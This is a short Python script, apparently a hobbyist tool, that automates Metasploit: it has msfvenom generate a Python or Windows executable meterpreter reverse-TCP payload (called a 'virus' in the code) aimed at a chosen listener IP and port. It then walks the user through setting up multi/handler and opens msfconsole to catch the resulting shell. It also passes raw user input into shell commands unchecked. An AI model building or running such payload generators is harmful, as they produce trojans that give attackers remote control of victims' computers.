import os
import time


def msf():
   def msflogo():
      os.system('clear')
      text = '''
\033[94m
                __                   _                 _ 
               / _|                 | |               | |
 _ __ ___  ___| |_ _ __   __ _ _   _| | ___   __ _  __| |
| '_ ` _ \/ __|  _| '_ \ / _` | | | | |/ _ \ / _` |/ _` |
| | | | | \__ \ | | |_) | (_| | |_| | | (_) | (_| | (_| |
|_| |_| |_|___/_| | .__/ \__,_|\__, |_|\___/ \__,_|\__,_|
                  | |           __/ |                    
                  |_|          |___/                     --made by
                                                             VulnExp--
\033[94m
      '''
      print(text)


   def msfcheck():
      x = input("Is Metasploit Installed (y/n)")
      if x =="y":
         pass
      elif x =="n":
         os.system('git clone https://github.com/rapid7/metasploit-framework')
      else:
         print('Try again')
         time.sleep(0.5)
         msfcheck()

   def msfpayload():
      directory = input("Select directory |> ")
      try:
         os.system('cd ' + directory)
      except:
         print("There was a problem, staying in the current directory")
      select_virus = input("Select exe/py |> ")
      if select_virus =="py":
         ip = input("Ip Listener |> ")
         port = input("Port Listener |> ")
         script = input("Script name |> ")
         os.system("msfvenom -p python/meterpreter_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f RAW > " + script + ".py")
         time.sleep(0.5)
         return port, ip
      elif select_virus =="exe":
         ip = input("Ip Listener |> ")
         port = input("Port Listener |> ")
         script = input("Script name |> ")
         os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe > " + script + ".exe")
         time.sleep(0.5)
         return port, ip
      


   def msfconsole():
      port, ip = msfpayload()
      print("")
      input('copy this in a notepad:      use multi/handler')
      input('this too:                    set LHOST=' + ip)
      input('and this:                    set LPORT=' + port)
      input('and:                         run')
      os.system('msfconsole')


   msflogo()
   msfcheck()
   msfconsole()


msf()
